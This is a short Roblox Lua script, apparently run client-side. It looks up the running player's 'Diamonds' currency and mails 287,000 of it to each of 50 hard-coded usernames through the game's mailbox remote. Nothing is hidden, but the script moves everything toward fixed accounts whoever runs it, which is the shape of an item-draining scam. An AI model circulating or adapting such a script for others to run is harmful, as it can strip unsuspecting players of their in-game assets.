local usernamesString = [[
SolarIvory232
AzureGriffin1439
RuneKnight3272
SolsticeXenon2580
FusionStorm3962
PhoenixWhisper7435
NimbusBolt5003
SpectralWolf9260
AzureIon4112
FusionWolf9842
QuantumKrypton4825
QuantumQuartz6000
InfernoFrost7301
SpectralPulse1141
SolarStryker1036
MirageWhisper1410
BlizzardKnight7967
LyricOmega3377
InfernoJade7956
EchoBlaze8651
MagnetVoid7779
MysticJinx1899
CobaltHorizon3177
PulseBlade3191
BlazePyro8851
RadiantJade6675
ZenTempest2523
FluxArcane5501
CobaltNexus4918
LunarZephyr4662
MagnetVortex9189
CelestialThrash2898
StellarKnight8873
ElectricQuiver70
NebulaInferno5199
ShadowQuake5844
StellarMercury5892
CypherReaper645
CelestialMyst8460
PulseRider7551
GravityKrypton9355
ZenHavoc1915
SolsticeDrift5242
GravityPyro7773
NovaSpecter5373
SolarCascade4088
HarmonyYuki3983
MagnetSpectra1020
NovaViper4523
AstroDusk8933
]]
local usernames = {}
for line in usernamesString:gmatch("([^\n]*)\n?") do
    table.insert(usernames, line)
end
local function sendMail(username, item, id, amount)
    local args = {
        [1] = username,
        [2] = "wer",
        [3] = item,
        [4] = id,
        [5] = amount
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    wait(0.5)
end


local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Save = require(RS.Library.Client.Save)

local itemname = "Diamonds"
local classname = "Currency"  -- String needs to be in quotes
totalitem = 287000

local function GetItemID()
    local data = Save.Get()
    local inventory = data and data.Inventory
    -- Use classname variable instead of hardcoding it
    if inventory and inventory[classname] then  -- Use [] notation to access with variable
        for uid, itemData in pairs(inventory[classname]) do
            if itemData.id == itemname then
                return uid
            end
        end
    end
    return nil
end
local result = GetItemID()
for _, username in pairs(usernames) do
    sendMail(username, classname, result, totalitem)--gems
    wait(1)
end
